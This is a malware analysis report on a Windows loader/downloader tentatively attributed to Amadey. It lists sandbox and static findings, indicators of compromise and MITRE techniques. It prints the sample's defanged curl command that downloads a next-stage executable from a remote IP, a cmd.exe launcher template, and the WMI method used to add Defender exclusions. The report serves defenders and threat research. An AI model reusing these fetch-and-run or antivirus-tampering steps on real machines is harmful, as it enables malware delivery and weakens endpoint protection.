---
title: "Malware Analysis: Amadey (PE · exe · 1febc52a)"
published: 2026-11-01
draft: false
description: "Malicious (medium confidence): Amadey · loader/downloader · difficulty medium · dynamic sandbox + static decompilation"
tags: ["Amadey", "loader", "downloader", "PE"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-01-Amadey-1febc52a"
---

> [!WARNING]
> **Verdict: malicious** · Family **Amadey** (doubtful) · Confidence **medium**
> 
> Aliases: Trojan.Win64.Amadey, Amadey loader
> 
> In the dynamic sandbox the sample was actually observed launching system curl to download a remote executable (hxxp://107[.]175[.]82[.]242:9000/wilow/lososo.exe) and building a cmd.exe /c start launch command in memory; statically it was also confirmed to add multiple Defender exclusion paths through WMI's MSFT_MpPreference and to masquerade using a forged Oracle code-signing certificate and a Background Update manifest. Overall it is determined to be a malicious downloader/loader.

## At a glance

| Item | Content |
|:--|:--|
| Family | **Amadey** · Aliases Trojan.Win64.Amadey, Amadey loader · _doubtful_ |
| Confidence | **Medium** |
| Behavior classes | loader · downloader |
| Difficulty | medium |
| First seen | 2026-10-30 19:20:05 |
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/1febc52a90edf9bab1f7d29e42df29660aaef1110ca3cfb63e080672c8f988ce/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Build curl download command</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Download next-stage payload</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Add Defender exclusions</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1562.001</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Masquerade as system update</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Forged code-signing cert</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1553.002</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `1febc52a90edf9bab1f7d29e42df29660aaef1110ca3cfb63e080672c8f988ce` |
| MD5 | _not recorded_ |
| Size | 4,521,576 bytes (4.3 MB) |
| Type | PE · `exe` |

## Behavior analysis

**8** behaviors in total, each backed by evidence: **6** are obtainable statically and **2** were obtained through dynamic analysis.

### 1. Builds a curl download command

`T1105` · Confidence **High** · Dynamic

Builds and executes the system curl command in memory: curl.exe -s -L --connect-timeout 10 --max-time 120 -o "%APPDATA%\q58bm5432" "hxxp://107[.]175[.]82[.]242:9000/wilow/lososo.exe".

> **Evidence**: UTF-16 command line at memory offset 0x307C1; sandbox network log shows curl.exe(7960) requesting 107.175.82[.]242:9000
> 
> **Source**: `ref:43ecfa46fd` · `ref:b628a0a978` · `ref:8cd6cca6aa`

### 2. Downloads the next-stage payload

`T1105` · Confidence **High** · Dynamic

Downloads the next-stage executable over plaintext HTTP GET /wilow/lososo.exe, destination port 9000, saving it to a randomly named file in the user's Roaming directory.

> **Evidence**: network monitoring recorded GET /wilow/lososo.exe, Host: 107.175.82[.]242:9000, User-Agent: curl/8.4.0
> 
> **Source**: `ref:b628a0a978` · `ref:551fad55db` · `ref:0f36ebdce8`

### 3. Adds Defender exclusions

`T1562.001` · Confidence **High** · Static

Queries/calls the root\Microsoft\Windows\Defender namespace through WMI, using the MSFT_MpPreference Add method and the ExclusionPath parameter to add C:\Windows\Temp, C:\Users\Public, and %TEMP% to the Defender exclusions.

> **Evidence**: from .rdata 0x451A3 there are consecutive strings root\Microsoft\Windows\Defender, MSFT_MpPreference, Add, TEMP, C:\Windows\Temp, C:\Users\Public, ExclusionPath; the process dynamically loads wbemprox/fastprox
> 
> **Source**: `ref:3f7acc2555` · `ref:263ada68cd` · `ref:9405ad34dd` · `ref:58b59e060f`

### 4. Masquerades as a system update component

`T1036.005` · Confidence **High** · Static

Uses the manifest name Contoso.BackgroundUpdate / description Background Update Service to masquerade as a background update service, combined with a forged code-signing certificate to reduce suspicion from users and endpoint protection.

> **Evidence**: resource-section manifest strings name="Contoso.BackgroundUpdate", description="Background Update Service"
> 
> **Source**: `ref:3f7acc2555` · `ref:263ada68cd` · `ref:9405ad34dd`

### 5. Forged code-signing certificate

`T1553.002` · Confidence **High** · Static

Embeds a self-signed PKCS#7 code signature whose subject impersonates Oracle Corporation / Background Transfer, valid from 2026-10-24 to 2036-10-21, used to impersonate a legitimate software publisher.

> **Evidence**: PKCS#7 at security directory offset 0x4F820; ASN.1 contains O=Oracle Corporation, CN=Background Transfer
> 
> **Source**: `ref:1ece069161` · `ref:479b9fc8be`

### 6. Anti-debugging checks

`T1497.001` · Confidence **High** · Static

Uses a TLS callback to run early code, employs rdtsc timing and PEB (gs:[0x60]) access to detect debugger/sandbox environments, and checks process names such as explorer.exe and MsMpEng.exe.

> **Evidence**: TLS callbacks rva 0xCCE4/0xCD4B; rdtsc @ rva 0xA134, PEB access @ rva 0x102B; explorer.exe / MsMpEng.exe appear in heap memory
> 
> **Source**: `ref:54d29ba386` · `ref:f231bcf6a3` · `ref:98233f6fe3`

### 7. Generates a random drop name

`T1036.008` · Confidence **High** · Static

Uses the built-in 36-character alphabet abcdefghijklmnopqrstuvwxyz0123456789 to generate a 9-character random filename (q58bm5432 in this run), avoiding signature matching on a fixed drop path.

> **Evidence**: 36-character alphabet in .rdata at 0x18320; q58bm5432 and the %APPDATA% path appear in heap memory at 0x31CF9
> 
> **Source**: `ref:3f7acc2555` · `ref:8cd6cca6aa` · `ref:43ecfa46fd`

### 8. Launches the payload via cmd

`T1059.003` · Confidence **Medium** · Static

Presets the command template cmd.exe /c start "" "<path>.exe" "%APPDATA%" to start the dropped file as a separate process after the download completes.

> **Evidence**: cmd.exe /c start "" "" in .rdata at 0x182F6, .exe" "APPDATA at 0x18314, payload.exe at 0x182E5
> 
> **Source**: `ref:3f7acc2555` · `ref:9405ad34dd` · `ref:263ada68cd`


## IOC (de-weaponized)

### Network

:::caution
**Pending dynamic verification**: the addresses above were obtained statically; no successful connection or session was observed under the analysis environment's network isolation, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://107[.]175[.]82[.]242:9000/wilow/lososo.exe` | 9000 | download | Static | ⏳ Not observed |

### Host

**Mutex**

- `WinUpdater`

**Drop paths**

- `%APPDATA%\q58bm5432`
- `%APPDATA%\<9-character random alphanumeric>`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `107[.]175[.]82[.]242:9000` | Yes | Dynamic |
| `download_url` | `hxxp://107[.]175[.]82[.]242:9000/wilow/lososo.exe` | Yes | Dynamic |
| `download_command` | `curl.exe -s -L --connect-timeout 10 --max-time 120 -o "%APPDATA%\<random>" "hxxp://107[.]175[.]82[.]242:9000/wilow/lososo.exe"` | Yes | Dynamic |
| `install_path` | `%APPDATA%\<random 9-char lowercase alnum> (q58bm5432 in this run)` | Yes | Dynamic |
| `launcher` | `cmd.exe /c start "" "<path>.exe" "%APPDATA%"` | Yes | Static |
| `defender_exclusions` | `C:\Windows\Temp; C:\Users\Public; %TEMP%` | Yes | Static |
| `mutex` | `WinUpdater` | No | Static |
| `encryption_algo` | `AES (a complete AES forward S-box exists; the specific call is unconfirmed)` | No | Static |
| `file_name_alphabet` | `abcdefghijklmnopqrstuvwxyz0123456789` | No | Static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; keep this in mind when citing this report.

- Not ransomware: no file encryption, shadow-copy deletion, or ransom note behavior was found.
- Not a stealer itself: no reads related to browser credentials, wallets, keylogging, or screenshots were observed.
- Do not assert an HTTPS C2 merely from the WinHTTP imports; dynamically only the plaintext HTTP download by curl was confirmed.
- No persistence was observed: there is no evidence of Run keys, scheduled tasks, or service creation, and persistence should not be reported.
- The forged Oracle certificate proves only masquerading and cannot support a conclusion that the sample was developed by Oracle or a real publisher.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Unpacking | No |

**Limitations and open questions**

1. The content returned by network emulation was not a valid PE, and no second-stage execution or injection was observed.
2. The Defender exclusions are inferred from static strings, WMI module loading, and the call surface; no WMI operation audit log was obtained.
3. The remote next-stage sample was not obtained, so the final payload family cannot be confirmed; Amadey is only a medium-confidence candidate.
4. The file has an unusually large repeated-padding overlay, and some static statistics and string results must be read against that background.
5. Although the sample imports WinHTTP, GetAdaptersInfo, and others, their actual call chains were not observed and were not counted as behavioral conclusions.
6. No persistence, lateral movement, credential theft, or destructive encryption behavior was observed.

## Evidence index

<details>
<summary>Expand 18 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ref:1977e55b22` | Sample triage | Hashes, section entropy, import surface, and packing score: 8 sections, no high-entropy section, packing score 0 |
| `ref:3fb7e59b7c` | PE structure parsing | PE32+ x64 GUI, entry RVA 0xCA94, image base 0x140000000, with TLS/exception/security directories |
| `ref:99db7de0ce` | Import table parsing | Imports WinHTTP, ole32/oleaut32 (WMI/COM), IPHLPAPI, ntdll memory APIs, etc. |
| `ref:3f7acc2555` | String extraction | Strings payload.exe, cmd.exe /c start, %APPDATA%, MSFT_MpPreference, ExclusionPath, C:\Windows\Temp, C:\Users\Public |
| `ref:8bff88528d` | Crypto constant identification | Complete AES forward S-box hit at file offset 0x181C0 |
| `ref:54d29ba386` | unpack.antidebug | Statically identified TLS callbacks, rdtsc timing, and PEB gs:[0x60] access |
| `ref:0f36ebdce8` | Dynamic analysis platform | Real sample detonation, PID 3972 alive and generating t0/t3 memory dumps, no new child-process timeline records |
| `ref:b628a0a978` | Dynamic analysis platform | Network monitoring recorded curl.exe(7960) requesting 107.175.82[.]242:9000 with GET /wilow/lososo.exe at runtime |
| `ref:551fad55db` | Dynamic analysis platform | The only anomalous download request related to the sample in the network log (the rest is system update/search noise) |
| `ref:43ecfa46fd` | memory-strings | Extracted the complete UTF-16 curl command line, download URL, and %APPDATA% drop path from the memory dump |
| `ref:8cd6cca6aa` | memory-strings | Heap memory contains q58bm5432, the URL, the %APPDATA% path, and explorer.exe / MsMpEng.exe |
| `ref:98233f6fe3` | memory-strings | Located the curl command, q58bm5432, and process-name check strings in the dump |
| `ref:58b59e060f` | Dynamic analysis platform | Process module scan shows wbemprox/fastprox/winhttp/webio/schannel/amsi and other modules loaded |
| `ref:263ada68cd` | hexdump | Confirmed the raw bytes of the Defender namespace, MSFT_MpPreference, ExclusionPath, and exclusion paths in .rdata |
| `ref:9405ad34dd` | decompile.symbols | Symbol/string view confirmed payload.exe, cmd.exe /c start, APPDATA, and repeated WinUpdater strings |
| `ref:1ece069161` | asn1.parse | Parsed the security directory PKCS#7: O=Oracle Corporation, CN=Background Transfer, self-signed validity period |
| `ref:479b9fc8be` | asn1.parse | Certificate ASN.1 structure: sha256WithRSA, serial number 37C550C04C591A7F9452A012CD47ECCD20C1D86D |
| `ref:f231bcf6a3` | string-scan | Family string search found no clear family identifier; only false hits such as PNG IDAT, supporting a candidate family designation |

</details>

---

_This report's sample is not public; IOCs have been de-weaponized and are for security research only._
